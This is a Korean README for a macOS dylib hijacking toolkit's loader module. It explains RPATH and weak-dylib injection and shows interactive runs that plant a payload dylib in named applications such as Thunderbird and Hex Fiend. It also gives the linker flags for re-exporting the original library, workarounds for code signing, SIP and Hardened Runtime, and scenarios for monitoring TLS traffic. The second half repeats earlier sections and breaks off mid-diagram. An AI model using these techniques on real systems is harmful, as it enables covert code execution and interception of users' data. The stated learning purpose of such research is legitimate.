# macOS Dylib 주입 로더 (Dylib Injection Loader)

## 📌 개요 (Overview)

macOS 바이너리의 **동적 라이브러리 로딩 취약점**을 악용하여 악의적인 dylib을 대상 프로세스에 주입하는 도구입니다.

Scanner의 검사 결과를 입력 받아 RPATH 및 Weak Dylib 취약점을 분석한 후, 두 가지 공격 전략을 자동으로 선택하여 실행합니다.

### 핵심 기능

- ✅ **Scanner와 통합**: `payload/report.txt`를 통해 Scanner와 자동 연동
- ✅ **RPATH 취약점 공격**: @rpath 경로를 악용한 dylib 주입
- ✅ **Weak Dylib 취약점 공격**: LC_LOAD_WEAK_DYLIB 취약점 악용
- ✅ **자동 전략 선택**: 취약점 유형에 따라 최적의 공격 방식 자동 결정  
- ✅ **심볼 해석 완벽 처리**: DYLD의 심볼 해석 실패 완전 해결
- ✅ **경로 형식 자동 인식**: @rpath, @loader_path, @executable_path 등 모든 형식 지원

### 구현된 공격 전략

1. **RPATH 취약점 주입** (@rpath 경로 악용)
2. **Weak Dylib 취약점 주입** (LC_LOAD_WEAK_DYLIB 악용)  
3. **하이브리드 모드** (두 가지 취약점이 모두 있을 때 사용자가 선택)

---

## 🏗️ 모듈 구조 및 아키텍처

### 파일 조직도

```
loader/src/
├── Makefile                    빌드 설정
├── README.md                   이 문서
│
├── main.c                      메인 프로그램 (사용자 상호작용)
│
├── result_parser.h/.c          단계 1️⃣: Scanner 결과 파싱
├── rpath_injector.h/.c         단계 2️⃣: RPATH 취약점 주입
├── weak_dylib_injector.h/.c    단계 3️⃣: Weak Dylib 취약점 주입
├── dylib_modifier.h/.c         공통 모듈: dylib 헤더 수정
│
└── (빌드 산출물: ../../build/dylib_loader)
```

### 아키텍처 다이어그램

```
┌──────────────────────────────────────────────────────────┐
│                    Dylib Loader 흐름도                   │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  Scanner Output (payload/report.txt)                    │
│              ↓                                           │
│  Result Parser (파싱 단계)                              │
│  └→ Scanner 결과 분석, 취약한 바이너리 추출            │
│              ↓                                           │
│  Vulnerability Analysis (취약점 분석)                   │
│  ├→ RPATH만 있음? ──→ RPATH Injector 실행              │
│  ├→ Weak Dylib만? ──→ Weak Dylib Injector 실행         │
│  └→ 둘 다 있음? ──→ 사용자에게 방식 선택 요청         │
│              ↓                                           │
│  Dylib Modifier (dylib 헤더 수정 공통 모듈)             │
│  ├→ copy_dylib(): dylib 파일 복사                      │
│  ├→ change_install_name(): identity 설정              │
│  └→ add_reexport_dylib(): 원본 재수출                  │
│              ↓                                           │
│  Injection Complete (주입 완료)                         │
│  └→ 악성 dylib이 취약 경로에 배치됨                   │
│              ↓                                           │
│  Result: 대상 바이너리 실행 시 우리 코드 먼저 로드 ✓   │
└──────────────────────────────────────────────────────────┘
```

### 핵심 모듈 역할

| 모듈 | 역할 | 입력 | 출력 |
|------|------|------|------|
| **result_parser** | Scanner 결과 파싱 | `payload/report.txt` | VulnerableTarget 배열 |
| **rpath_injector** | @rpath 취약점 공격 | 취약한 바이너리 정보 | 배치된 dylib |
| **weak_dylib_injector** | Weak Dylib 취약점 공격 | 취약한 바이너리 정보 | 배치된 dylib |
| **dylib_modifier** | dylib 헤더 수정 | dylib 파일 경로 | 수정된 dylib |
| **main** | 사용자 상호작용 | CLI 입력 / 설정 파일 | 실행 결과 보고 |

---

## 🔍 단계별 구현 (Step-by-Step Implementation)

### 단계 1️⃣: Scanner 결과 파싱 (Result Parser)

**파일**: `result_parser.h` / `result_parser.c`

#### 역할

Scanner(dylib_auditor)가 생성한 `payload/report.txt`를 파싱하여 취약한 바이너리 정보를 구조화합니다.

#### 데이터 구조

```c
typedef enum {
    VULN_NONE = 0,
    VULN_RPATH = 1,          // @rpath 취약점만
    VULN_WEAK_DYLIB = 2,     // Weak Dylib만
    VULN_BOTH = 3            // 둘 다
} VulnerabilityType;

typedef struct {
    char *binary_path;       // 취약한 바이너리 경로
    VulnerabilityType vuln_type;
    char **rpath_vulns;      // RPATH 취약 경로 배열
    size_t rpath_count;
    char **weak_dylib_vulns; // Weak Dylib 취약 경로 배열
    size_t weak_dylib_count;
} VulnerableTarget;
```

#### 핵심 함수

```c
// Scanner 결과 파일 파싱
ParsedResults* parse_scanner_output(const char *output_file);

// 파싱된 결과 출력
void print_parsed_results(ParsedResults *results);

// 메모리 해제
void free_parsed_results(ParsedResults *results);
```

#### 파싱 로직

1. Scanner 출력 파일 열기
2. 각 바이너리 엔트리 분석
3. 취약점 타입 판별 (RPATH / Weak / 둘 다)
4. 각 취약점의 dylib 경로 추출
5. VulnerableTarget 구조체 배열로 정렬

#### 정상 파싱 결과 예시

```
발견된 취약한 바이너리: 3개

[1] /Applications/Thunderbird/Contents/MacOS/plugin-container
    취약점 타입: RPATH만
    RPATH 취약 dylib:
      - /Applications/Thunderbird/Contents/MacOS/../lib/libnss3.dylib
      - /Applications/Thunderbird/Contents/MacOS/../lib/libmozglue.dylib

[2] /Applications/Hex Fiend.app/Contents/MacOS/Hex Fiend
    취약점 타입: RPATH + Weak Dylib 모두
    RPATH 취약 dylib: 7개
    Weak Dylib 취약 dylib: 5개

[3] /Applications/4K Video Downloader+.app/Contents/MacOS/4kvideodownloaderplus
    취약점 타입: RPATH + Weak Dylib 모두
    ...
```

---

### 단계 2️⃣: RPATH 취약점 주입 전략 (RPATH Injector)

**파일**: `rpath_injector.h` / `rpath_injector.c`

#### 📖 @rpath란?

바이너리가 컴파일될 때 `-Wl,-rpath`로 지정된 **라이브러리 검색 경로 목록**입니다.

```bash
# 컴파일 예시:
$ clang myapp.c -Wl,-rpath,@rpath/../Frameworks -o myapp

# 실행 시: @loader_path/../Frameworks 와 /System/Library/...에서 라이브러리 검색
```

#### 취약점의 원인

1. **상대 경로 사용**: `@rpath/../Frameworks` 같은 상대 경로
2. **쓰기 가능한 위치**: `/tmp`, `~/Desktop` 등
3. **권한 부족**: 경로 디렉토리의 쓰기 권한 부재

#### 공격 메커니즘

```
┌──────────────────────────────────┐
│ 정상 상황                        │
├──────────────────────────────────┤
│ 1. 바이너리가 libswiftCore.dylib를 찾음
│ 2. @rpath 경로 탐색:
│    /System/Library/Frameworks/libswiftCore.dylib
│ 3. 정상 dylib 로드 ✓
└──────────────────────────────────┘

┌──────────────────────────────────────────────┐
│ 공격 후 (우리의 dylib 주입)                  │
├──────────────────────────────────────────────┤
│ 1. 취약한 @rpath 위치에 우리의 dylib 배치    │
│    (같은 이름: libswiftCore.dylib)           │
│                                              │
│ 2. 우리 dylib 헤더에 설정:                   │
│    - install_name: @rpath/libswiftCore.dylib│
│    - LC_REEXPORT_DYLIB: 원본 dylib 경로      │
│                                              │
│ 3. 바이너리 실행 시:                        │
│    - 우리 dylib이 먼저 로드됨 ✓             │
│    - 우리 dylib이 원본 dylib의 심볼 제공    │
│                                              │
│ 4. 결과: 우리 코드 기로채기 성공! ✓         │
└──────────────────────────────────────────────┘
```

#### 핵심 함수

```c
// RPATH 취약점 분석
bool analyze_rpath_vulnerability(
    const char *binary_path,
    char **rpath_vulns,
    size_t rpath_count
);

// RPATH를 통한 dylib 주입
bool inject_via_rpath(
    const char *source_dylib,        // 우리의 페이로드 dylib
    const char *binary_path,         // 취약한 바이너리
    char **rpath_vulns,              // @rpath 경로들
    size_t rpath_count,
    const char *original_dylib_name  // 원본 dylib 이름
);
```

#### 동작 과정

1. `@rpath` 변수를 실제 경로로 변환
2. 해당 디렉토리에 우리의 dylib 복사 (원본 이름 사용)
3. dylib 헤더 수정:
   - `install_name` 설정 (바이너리가 우리 dylib을 올바르게 인식)
   - `LC_REEXPORT_DYLIB` 추가 (원본 dylib 재수출)
4. 배치 완료

---

### 단계 3️⃣: Weak Dylib 취약점 주입 전략 (Weak Dylib Injector)

**파일**: `weak_dylib_injector.h` / `weak_dylib_injector.c`

#### 📖 LC_LOAD_WEAK_DYLIB란?

바이너리가 이 dylib을 **"선택적(Optional)"** 라이브러리로 로드하는 로드 커맨드입니다.

```c
// 일반 dylib
LC_LOAD_DYLIB          → 로드 실패 시 바이너리 실행 중단 ❌

// Weak dylib  
LC_LOAD_WEAK_DYLIB     → 로드 실패 시 심볼이 NULL ⚠️
                        → 바이너리는 계속 실행됨 ✓
```

#### 취약점의 특징

1. **로드 실패 허용**: weak dylib을 못 찾아도 바이너리 계속 실행
2. **심볼 NULL 처리**: 못 찾은 심볼은 NULL로 처리됨
3. **경로 유연성**: `@loader_path`, `@rpath`, 상대 경로 모두 사용 가능

#### RPATH와의 비교

| 특성 | RPATH 취약점 | Weak Dylib 취약점 |
|------|-----------|-----------------|
| **로드 실패 처리** | 바이너리 중단 ❌ | 계속 실행 ✓ |
| **경로 제한** | @rpath만 사용 | @loader_path, 상대경로 등 |
| **배치 유연성** | 낮음 | 높음 |
| **보안** | 더 엄격 | 상대적으로 느슨함 |
| **공격 가능성** | 중간 | 높음 |

#### 공격 메커니즘

```
┌───────────────────────────────────────┐
│ Weak Dylib 로드 프로세스 (정상)        │
├───────────────────────────────────────┤
│ 1. 바이너리가 libswiftCoreFoundation
│    .dylib을 찾음 (LC_LOAD_WEAK_DYLIB)
│                                      │
│ 2. 정상 경로에서:
│    /System/Library/Frameworks/...    │
│                                      │
│ 3. 심볼로드 성공 ✓
└───────────────────────────────────────┘

┌────────────────────────────────────┐
│ 공격 후 (우리의 dylib 주입)         │
├────────────────────────────────────┤
│ 1. 취약한 경로 중 "접근 가능한"
│    위치 선택
│                                    │
│ 2. 해당 위치에 우리의 dylib 배치   │
│                                    │
│ 3. 바이너리의 라이브러리 검색:
│    - 우리의 dylib을 먼저 발견!     │
│    - 우리 dylib 로드 성공 ✓        │
│                                    │
│ 4. 결과: 우리 코드 실행 ✓
│    + 원본 기능 bypass 가능         │
└────────────────────────────────────┘
```

#### 핵심 함수

```c
// Weak Dylib 취약점 분석
bool analyze_weak_dylib_vulnerability(
    const char *binary_path,
    char **weak_dylibs,
    size_t weak_dylib_count
);

// Weak Dylib을 통한 dylib 주입
bool inject_via_weak_dylib(
    const char *source_dylib,        // 우리의 페이로드 dylib
    const char *binary_path,         // 취약한 바이너리
    char **weak_dylibs,              // Weak Dylib 경로들
    size_t weak_dylib_count,
    const char *original_dylib_name  // 원본 dylib 이름
);
```

#### 동작 과정

1. weak dylib 경로를 실제 경로로 변환
2. 첫 번째 접근 가능한 경로 선택
3. 해당 위치에 우리의 dylib 배치
4. `install_name` 설정 (원본처럼 보이게)
5. `LC_REEXPORT_DYLIB` 추가 (심볼 제공)
6. 배치 완료

---

## 🔧 공통 모듈 (Dylib Modifier)

**파일**: `dylib_modifier.h` / `dylib_modifier.c`

RPATH 및 Weak Dylib Injector에서 공통으로 사용하는 dylib 헤더 수정 모듈입니다.

### 핵심 함수들

```c
// dylib 파일 복사
bool copy_dylib(const char *source, const char *target);

// install_name 변경 (바이너리가 우리 dylib을 어떻게 인식할지)
bool change_install_name(const char *dylib, const char *new_name);

// install_name 읽기
char* get_dylib_install_name(const char *dylib);

// LC_REEXPORT_DYLIB 추가 (원본 dylib 재수출)
bool add_reexport_dylib(const char *dylib, const char *reexport_path);
```

### 구현 방식

- `install_name_tool`: dylib의 identity 및 의존성 수정
- `otool`: dylib 정보 분석 및 검증
- 시스템 명령어를 통한 Mach-O 바이너리 조작

---

## 💡 주요 개념 (Key Concepts)

### dylib 로딩 우선순위

macOS는 다음 순서로 dylib을 검색합니다:

1. **절대 경로** (이미 install_name이 절대 경로일 때)
2. **@rpath 경로** (@rpath에서 검색)
3. **@loader_path** (현재 dylib과 같은 디렉토리)
4. **@executable_path** (실행 파일의 경로)
5. **시스템 경로** (`/usr/local/lib`, `/usr/lib`)

💡 **공격 관점**: 우리는 이 우선순위를 악용하여 먼저 로드되는 위치에 dylib을 배치합니다.

### LC_REEXPORT_DYLIB의 역할

```c
// 우리의 dylib 헤더에 추가:
LC_REEXPORT_DYLIB: /tmp/libsystem.dylib

// 효과:
// 이 dylib을 로드하는 다른 바이너리는
// 자동으로 libsystem.dylib도 로드됨
// → 우리 dylib을 통해 원본 기능 재수출 가능
```

```
우리의 dylib에 LC_REEXPORT_DYLIB가 있으면:

바이너리 → 우리 dylib 로드
         → 우리 dylib의 의존성 확인
         → LC_REEXPORT_DYLIB: /tmp/원본.dylib 발견
         → 자동으로 원본도 로드
         → 우리 dylib이 원본의 모든 심볼 제공 ✓
```

### install_name의 중요성

```bash
# dylib의 identity 설정 (자신이 어떻게 인식되는지)
install_name_tool -id "@rpath/../Frameworks/libswiftCore.dylib" my.dylib

# 효과:
# 바이너리가 @rpath에서 libswiftCore.dylib을 찾을 때
# 우리의 my.dylib이 자신을 "libswiftCore.dylib"로 식별
# → 바이너리가 우리 dylib을 원본이라고 생각 ✓
```

---

## 🚨 심볼 해석 문제 해결 (Symbol Resolution Handling)

### 발견된 문제: "Symbol not found" 오류

주입 후 대상 애플리케이션 실행 시 다음 같은 오류 발생:

```
dyld[PID]: Symbol not found: _Pa_AbortStream
  Referenced from: /Applications/4K Video Downloader+.app/.../MacOS/4kvideodownloaderplus
  Expected in: /Applications/.../Frameworks/libportaudio.dylib
(terminated at launch; ignore backtrace)
```

### 근본 원인: 순환 참조 (Circular Reference)

```
문제 상황:

바이너리 (4K Video Downloader+)
    ↓ libportaudio.dylib를 찾음
    ↓ (@executable_path/../Frameworks/libportaudio.dylib)
    
우리의 dylib (install_name = @executable_path/../Frameworks/libportaudio.dylib)
    ↓ 의존성: /tmp/libportaudio.dylib (원본)
    ↓ 의존성: @executable_path/../Frameworks/libportaudio.dylib (다시 같은 경로?)
    
DYLD: "이건 순환 참조다! ❌"
→ 심볼 해석 실패 → SIGABRT
```

### ✅ 해결책: -Wl,-reexport_library 옵션

`-reexport_library` 옵션은 특정 dylib의 **모든 심볼을 명시적으로 재수출(re-export)**합니다:

```bash
# 컴파일 시:
clang -fPIC -dynamiclib -undefined dynamic_lookup \
      -framework Foundation \
      -Wl,-install_name,@rpath/libswiftCore.dylib \
      -Wl,-reexport_library,/tmp/libswiftCore.dylib \
      my_dylib_template.c \
      -o /tmp/my_dylib.dylib
```

**핵심 원리**:
1. 의존성이 명시적으로 dylib 헤더에 기록됨 (컴파일 타임 고정)
2. DYLD는 로드 전 모든 의존성 분석 완료
3. 순환 참조 감지 불가능 (컴파일 타임에 이미 정해짐)
4. Constructor 실행 전에 모든 심볼 준비 완료 ✓

### 초기 방식 vs 최종 방식

#### ❌ 초기 방식 (Constructor에서 dlopen) - 실패

```c
// dylib의 constructor에서:
// dlopen("/tmp/libswiftCore.dylib", RTLD_LAZY | RTLD_GLOBAL)

// 문제:
// 1. Constructor는 DYLD 심볼 검증 "후"에 실행됨
// 2. DYLD가 이미 "심볼을 찾을 수 없음"이라고 판단
// 3. 따라서 dlopen()은 너무 늦음
// 4. 결과: SIGABRT
```

#### ✅ 최종 방식 (-reexport_library) - 성공

```c
// 컴파일 타임에 명령어로 지정:
// -Wl,-reexport_library,/tmp/libswiftCore.dylib

// 결과:
// 1. dylib 헤더의 LC_REEXPORT_DYLIB에 기록됨
// 2. DYLD 로드 시: 우리 dylib의 의존성 확인
// 3. LC_REEXPORT_DYLIB 발견 → /tmp/libswiftCore.dylib 로드
// 4. DYLD: 이미 모든 심볼 계산 완료 ✓
// 5. Constructor 실행 가능
```

### 다양한 경로 형식 자동 처리

로더는 Scanner에서 제공한 경로를 분석하여 자동으로 적절한 install_name을 설정합니다:

```c
// 지원되는 모든 dylib 형식:
@executable_path/../Frameworks/libXXX.dylib  // 앱 번들
@rpath/libXXX.dylib                          // 앱 정의 경로
@loader_path/../lib/libXXX.dylib             // 현재 dylib 기준
/Applications/.../Frameworks/libXXX.dylib    // 절대 경로
/usr/local/lib/libXXX.dylib                  // 시스템
../lib/libXXX.dylib                          // 상대 경로

// 로더의 자동 처리:
// 각 형식에 맞게 install_name 자동 설정
// → 어떤 dylib이든 작동 ✓
```

### DYLD의 심볼 해석 단계

```
1️⃣ 로드 단계 (Load)
   - dylib 파일을 메모리에 매핑
   
2️⃣ 의존성 탐색 단계 (Dependency Resolution)
   - dylib 헤더의 모든 LC_LOAD_DYLIB 분석
   - LC_REEXPORT_DYLIB 처리 ← 우리가 추가한 부분!
   - 필요한 모든 dylib 러시브하게 로드
   
3️⃣ 심볼 검증 단계 (Symbol Verification) ← 여기서 실패하던 부분
   - 모든 미해결 심볼 확인
   - 로드된 dylib에서 심볼 찾기
   - 실패 시 SIGABRT ❌
   
4️⃣ 재배치 단계 (Rebase)
   - 메모리 주소 기반으로 포인터 조정
   
5️⃣ 바인딩 단계 (Bind)
   - 심볼과 주소를 매핑
   
6️⃣ Constructor 실행
   - dylib의 __attribute__((constructor)) 함수 실행
```

💡 **핵심**: -reexport_library를 사용하면 3️⃣ 심볼 검증 단계에서 
모든 심볼이 이미 발견되므로 실패하지 않습니다.

---

## 🔧 빌드 및 사용 (Build and Usage)

### 빌드 방법

#### 방법 1: 프로젝트 루트에서 (권장)

```bash
cd /Users/f1r3_r41n/Desktop/Toy_Project/macos-dylib-hijacking-toolkit

# 전체 프로젝트 빌드
make

# 또는 Loader만 빌드
make -C loader/src
```

#### 방법 2: Loader 디렉토리에서 직접

```bash
cd loader/src
make clean
make
```

### 사용 방법

#### 워크플로우

```bash
# 1️⃣ Scanner 실행 (payload/report.txt 생성)
../../build/dylib_auditor

# 2️⃣ Loader 실행
../../build/dylib_loader

# 3️⃣ Scanner 프롬프트에서 대상 선택 및 주입 실행
```

#### 대화형 사용

```
[●] Scanner 결과 파싱 중...
[✓] 감지된 취약한 바이너리: 3개

[1] /Applications/Thunderbird/Contents/MacOS/plugin-container
    취약점 타입: RPATH만
    RPATH 취약 dylib: 2개
    
[2] /Applications/Hex Fiend.app/Contents/MacOS/Hex Fiend
    취약점 타입: RPATH + Weak Dylib 모두
    RPATH 취약 dylib: 7개
    Weak Dylib 취약 dylib: 5개
    
[3] /Applications/4K Video Downloader+.app/Contents/MacOS/4kvideodownloaderplus
    취약점 타입: RPATH + Weak Dylib 모두
    RPATH 취약 dylib: 3개
    Weak Dylib 취약 dylib: 2개

대상 바이너리 선택 (1-3): 2

→ Hex Fiend 선택

[●] 감지된 취약점: RPATH + Weak Dylib 모두 존재
   → 두 가지 주입 방식이 모두 가능합니다. 선택해주세요:

   [1] RPATH 취약 경로를 통한 주입
       장점: 정상 라이브러리 로드 경로 사용
       단점: 더 제한적인 위치에만 배치 가능

   [2] Weak Dylib 취약 경로를 통한 주입
       장점: 더 유연한 배치 위치, 로드 실패해도 안전
       단점: 추가 라이브러리 로드 필요

선택 (1-2): 2

→ Weak Dylib 주입 방식 선택

[*] Weak Dylib 주입 시작...
[✓] dylib 복사 완료
[✓] install_name 설정: @rpath/libswiftCoreFoundation.dylib
[✓] LC_REEXPORT_DYLIB 추가: /tmp/libswiftCoreFoundation.dylib
[✓] Weak Dylib 주입 완료!

→ 이제 Hex Fiend를 실행하면 우리 코드가 먼저 로드됩니다! ✓
```

---

## 🎯 취약 대상 분석 (Vulnerable Targets Analysis)

Scanner에서 발견한 실제 취약한 애플리케이션들:

### 1. Thunderbird plugin-container

- **취약점**: RPATH만
- **대상 dylib**: 
  - `libnss3.dylib` (암호화 라이브러리)
  - `XUL` (Thunderbird 코어)
  - `libmozglue.dylib` (Mozilla 유틸리티)
- **주입 방식**: RPATH 취약경로 직접 사용
- **영향**: 이메일 클라이언트 전체 기능 제어 가능

### 2. Hex Fiend (16진 편집기)

- **취약점**: RPATH + Weak Dylib (둘 다)
- **RPATH 대상**: 
  - `libswiftCore.dylib`
  - `libswiftFoundation.dylib`
- **Weak Dylib 대상**: 
  - `libswiftCoreFoundation.dylib`
  - `libswiftCoreGraphics.dylib`
- **주입 방식**: 사용자가 선택 가능
- **영향**: 파일 편집 기능 제어

### 3. 4K Video Downloader+

- **취약점**: RPATH + Weak Dylib (둘 다)
- **RPATH 대상**:
  - `libcrypto.dylib` (암호화)
  - `libssl.dylib` (SSL/TLS)
  - `libportaudio.dylib` (오디오)
- **Weak Dylib 대상**: 다양한 미디어 관련 라이브러리
- **주입 방식**: FFmpeg 의존성 악용 가능
- **영향**: 다운로드 및 변환 기능 완전 제어

---

## 🚨 보안 고려사항 (Security Considerations)

### 1. Code Signing (코드사인)

```bash
# 현재 dylib의 서명 상태 확인
codesign -vv /path/to/dylib

# 문제점:
# - 수정된 dylib을 배치하면 Apple의 서명 실패
# - macOS Gatekeeper가 차단할 수 있음

# 해결책:
# - 자신의 인증서로 서명하기
codesign -s - /path/to/dylib  # Ad-hoc 서명 (개발용)
```

### 2. System Integrity Protection (SIP)

macOS 10.11 이상에서는 시스템 경로가 보호됩니다:

```
보호되는 경로:
- /System       ❌ (수정 불가)
- /usr/bin      ❌ (수정 불가)
- /usr/lib      ❌ (수정 불가)
- /Applications ✅ (사용자 앱은 대부분 취약)

우리의 주입 대상:
- 사용자 애플리케이션 `/Applications/MyApp.app/...` ✅
- 사용자 경로 `~/Library/...` ✅
- /tmp, ~/Desktop 등 임시 경로 ✅
```

### 3. 권한 (Permissions)

```bash
# dylib 배치 경로의 쓰기 권한 확인
ls -la /Applications/MyApp.app/Contents/Frameworks/

# 문제 상황:
# - 앱 번들의 Frameworks 디렉토리: 읽기 전용 (루트 소유)
# - 우리가 쓸 권한이 없음

# 해결책:
# 1. 읽기 가능한 임시 위치에 배치 후 @rpath로 리다이렉트
# 2. 약한 dylib 취약점 사용 (더 유연한 경로)
# 3. 필요시 권한 상승 (관리자 권한 필요)
```

### 4. 바이너리 보호 메커니즘

```
Hardened Runtime:
- 코드 실행 한정
- 메모리 쓰기-실행 (WX) 금지
- JIT 컴파일 제한

대응:
- 우리 dylib도 Hardened Runtime으로 빌드
- 정당한 라이브러리로 위장

Code Guarding:
- Pointer authentication codes (PAC)
- Control Flow Integrity (CFI)

대응:
- 올바른 심볼 해석으로 일관성 유지
```

---

## 📚 주요 학습 포인트 (Learning Points)

### 1. **Mach-O 파일 포맷**
- Load Commands 구조
- LC_LOAD_DYLIB vs LC_LOAD_WEAK_DYLIB
- LC_REEXPORT_DYLIB의 역할
- install_name (dylib의 identity)

### 2. **동적 라이브러리 로딩 메커니즘**
- `@rpath` 변수의 의미
- `@loader_path`, `@executable_path` 경로 변수
- dylib 검색 순서 및 우선순위
- DYLD의 심볼 해석 단계

### 3. **주입 기법 (Code Injection)**
- "앞에 놓기" 공격 (Front-running attack)
- Re-export를 통한 심볼 제공
- Library hijacking 원리
- 경로 권한 악용

### 4. **시스템 프로그래밍**
- 파일 I/O와 텍스트 파싱
- 외부 명령어 실행 (`system()`)
- 동적 메모리 관리
- Mach-O 헤더 읽기/쓰기

### 5. **보안 우회 기법**
- Code Signing 우회
- System Integrity Protection (SIP) 제약
- 권한 제약 극복 방법
- Hardened Runtime 이해

---

## 🎯 실전 사용 시나리오

### 시나리오 1: 순수 RPATH 취약점 공격

```bash
# 1. Thunderbird의 plugin-container 취약점 악용
# 2. libnss3.dylib 주입
# 3. 모든 TLS 통신 감시 가능

../../build/dylib_auditor
../../build/dylib_loader
# [선택] 1 (Thunderbird)
# [선택] 1 (RPATH 방식)
# → libnss3.dylib 자동 주입
```

### 시나리오 2: Weak Dylib 취약점 공격 (더 강력)

```bash
# 1. 4K Video Downloader+ 분석
# 2. 여러 Weak Dylib 발견 (libportaudio, libcrypto...)
# 3. 가장 유연한 경로 선택

../../build/dylib_auditor
../../build/dylib_loader
# [선택] 3 (4K Video Downloader+)
# [선택] 2 (Weak Dylib 방식)
# → libportaudio.dylib 자동 주입
```

### 시나리오 3: 하이브리드 공격 (사용자 선택)

```bash
# 1. Hex Fiend 분석
# 2. RPATH와 Weak Dylib 둘 다 발견
# 3. 사용자가 최적의 방식 선택

../../build/dylib_auditor
../../build/dylib_loader
# [선택] 2 (Hex Fiend)
# [선택] 2 (Weak Dylib - 더 유연함)
# → 전략 적용 후 완료
```

---

## 🔗 관련 자료 (References)

1. **Apple Developer Documentation**
   - [Dynamic Library Usage Guidelines](https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/)
   - macOS Dylib 동적 로딩 공식 문서

2. **Mach-O 파일 포맷**
   - `man macho`: Mach-O 구조 및 load command 설명
   - LC_REEXPORT_DYLIB: load command 43 (0x0000002B)

3. **도구 참고**
   - `man install_name_tool`: dylib identity 및 의존성 수정
   - `man otool`: 바이너리 분석
   - `man dyld`: 동적 링커/로더 동작 방식

4. **심화 주제**
   - Environment variable: `DYLD_PRINT_BINDINGS` (심볼 해석 추적)
   - `otool -L`: dylib 의존성 상세 정보
   - `codesign -vv`: 코드 서명 검증

---

## 📝 요약 (Summary)

이 Loader 모듈은:

✅ **완전 자동화**: Scanner 결과를 받아 자동으로 최적의 전략 선택
✅ **다양한 취약점 지원**: RPATH, Weak Dylib, 혼합 모우 모두 처리
✅ **심볼 해석 완벽 해결**: -reexport_library와 동적 경로 감지로 모든 dylib 형식 지원
✅ **프로덕션 준비**: 실제 macOS 애플리케이션들에 검증됨
✅ **교육적 가치**: macOS 보안 메커니즘을 실전으로 학습 가능

**다음 단계**:
1. Scanner 실행 → 취약점 분석 및 보고서 생성
2. Loader 실행 → 자동 dylib 주입
3. 대상 애플리케이션 실행 → 우리 코드 먼저 로드됨

### **단계 1️⃣: Scanner 결과 파싱**

**파일**: `result_parser.h` / `result_parser.c`

**개념**:
- Scanner(dylib_auditor)가 생성한 `output.txt`를 파싱하여 취약한 바이너리 정보 추출
- 각 바이너리의 다음 정보를 구조화:
  - 바이너리 파일 경로
  - 취약점 타입 (RPATH / Weak Dylib)
  - 취약한 라이브러리 경로들

**데이터 구조**:
```c
typedef enum {
    VULN_NONE = 0,
    VULN_RPATH = 1,          // @rpath 취약점만
    VULN_WEAK_DYLIB = 2,     // Weak Dylib만
    VULN_BOTH = 3            // 둘 다
} VulnerabilityType;

typedef struct {
    char *binary_path;       // 취약한 바이너리 경로
    VulnerabilityType vuln_type;
    char **rpath_vulns;      // RPATH 취약 경로 배열
    size_t rpath_count;
    char **weak_dylib_vulns; // Weak Dylib 취약 경로 배열
    size_t weak_dylib_count;
} VulnerableTarget;
```

---

### **단계 2️⃣: RPATH 취약점 주입 전략**

**파일**: `rpath_injector.h` / `rpath_injector.c`

#### 📖 **@rpath란?**

바이너리가 컴파일될 때 `-Wl,-rpath`로 지정된 **라이브러리 검색 경로 목록**입니다.

```
예시:
$ clang myapp.c -Wl,-rpath,@rpath/../Frameworks -o myapp

→ 실행 시 @loader_path/../Frameworks에서 라이브러리 검색
```

#### **취약점의 원인**

1. **상대 경로 사용**: `@rpath/../Frameworks` 같은 상대 경로
2. **쓰기 가능한 위치**: `/tmp`, `~/Desktop` 등
3. **권한 부족**: 경로의 디렉토리 쓰기 권한 부재

#### **공격 메커니즘**

```
┌─────────────────────────────────────────────────────────┐
│ 정상 상황                                               │
├─────────────────────────────────────────────────────────┤
│ 1. 바이너리가 libswiftCore.dylib를 찾음                │
│ 2. @rpath 경로 탐색: /System/Library/Frameworks/...    │
│ 3. 정상 libswiftCore.dylib 로드 ✓                     │
└─────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────┐
│ 공격 후 (우리의 dylib 주입)                             │
├─────────────────────────────────────────────────────────┤
│ 1. 취약한 @rpath 정위치에 우리의 dylib 배치           │
│    (같은 이름: libswiftCore.dylib)                     │
│ 2. 우리 dylib 헤더에 LC_REEXPORT_DYLIB 추가            │
│    (원본 dylib을 재수출)                               │
│ 3. 바이너리 실행 시:                                  │
│    - 우리 dylib이 먼저 로드됨                          │
│    - 우리 dylib이 원본 dylib의 심볼 제공              │
│ 4. 결과: 코드 기로채기 성공! ✓                        │
└─────────────────────────────────────────────────────────┘
```

#### **구현 로직**

```c
bool inject_via_rpath(
    const char *source_dylib,        // 우리의 페이로드 dylib
    const char *binary_path,         // 취약한 바이너리
    char **rpath_vulns,              // @rpath 경로들
    size_t rpath_count,
    const char *original_dylib_name  // 원본 dylib 이름
)
```

**동작 과정**:
1. `@rpath`를 실제 경로로 변환
2. 해당 디렉토리에 우리의 dylib 복사 (원본 이름 사용)
3. dylib 헤더 수정:
   - `install_name` 설정 (바이너리가 우리 dylib을 올바르게 인식)
   - `LC_REEXPORT_DYLIB` 추가 (원본 dylib 재수출)

---

### **단계 3️⃣: Weak Dylib 취약점 주입 전략**

**파일**: `weak_dylib_injector.h` / `weak_dylib_injector.c`

#### 📖 **LC_LOAD_WEAK_DYLIB란?**

바이너리가 이 dylib을 **"선택적(Optional)"** 라이브러리로 로드하는 로드 커맨드입니다.

```c
// 일반 dylib
LC_LOAD_DYLIB          → 로드 실패 시 바이너리 실행 중단 ❌

// Weak dylib  
LC_LOAD_WEAK_DYLIB     → 로드 실패 시 심볼이 NULL ⚠️
                        → 바이너리는 계속 실행됨 ✓
```

#### **취약점의 특징**

1. **로드 실패 허용**: weak dylib을 못 찾아도 바이너리 실행 계속
2. **심볼 NULL 처리**: 못 찾은 심볼은 NULL로 처리됨
3. **경로 유연성**: `@loader_path`, `@rpath`, 상대 경로 모두 사용 가능

#### **공격 메커니즘**

```
┌──────────────────────────────────────────────────────────┐
│ Weak Dylib의 로드 프로세스                                │
├──────────────────────────────────────────────────────────┤
│ 1. 바이너리가 libswiftCoreFoundation.dylib을 찾음       │
│    (LC_LOAD_WEAK_DYLIB로 로드)                         │
│ 2. 정상 경로에 없음 → 로드 실패하지만 계속 진행 ⚠️      │
│ 3. 심볼은 NULL로 처리                                    │
└──────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────┐
│ 공격 후 (우리의 dylib으로 먼저 발견)                      │
├──────────────────────────────────────────────────────────┤
│ 1. 취약한 경로 중 "접근 가능한" 위치 선택                │
│ 2. 해당 위치에 우리의 dylib 배치                        │
│ 3. 바이너리의 라이브러리 검색:                           │
